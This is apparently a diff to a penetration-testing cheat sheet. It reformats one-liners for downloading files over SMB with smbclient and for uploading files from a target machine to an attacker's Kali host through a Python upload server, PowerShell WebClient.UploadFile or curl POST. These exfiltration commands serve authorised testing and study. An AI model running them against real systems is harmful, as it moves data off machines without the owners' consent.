@@ -33,7 +33,7 @@ smbclient $>:prompt OFF # disable prompts; kali-machine
 smbclient $>:cd <remote_path> # change remote directory; kali-machine
 smbclient $>:lcd <local_path> # change local directory; kali-machine
 smbclient $>:mget * # download all files; kali-machine
-Python File Upload from target to kali:https://gist.github.com/UniIsland/3346170
-Python File Upload from target to kali:python simpleHTTPServerWithUpload.py <kaliPort> #kali-machine
-Python File Upload from target to kali:powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://<kali>:<kaliPort>/', '<file location>')" #target-machine
-Python File Upload from target to kali:curl.exe -X POST http://<kali>:8008/upload -F "files=@<file location> #target-machine
+Python File Upload from target to kali:
+Python File Upload from target to kali:python simpleHTTPServerWithUpload.py <kaliPort> # https://gist.github.com/UniIsland/3346170; kali-machine
+Python File Upload from target to kali:powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://<kali>:<kaliPort>/', '<file location>')" # target-machine
+Python File Upload from target to kali:curl.exe -X POST http://<kali>:8008/upload -F "files=@<file location> # target-machine
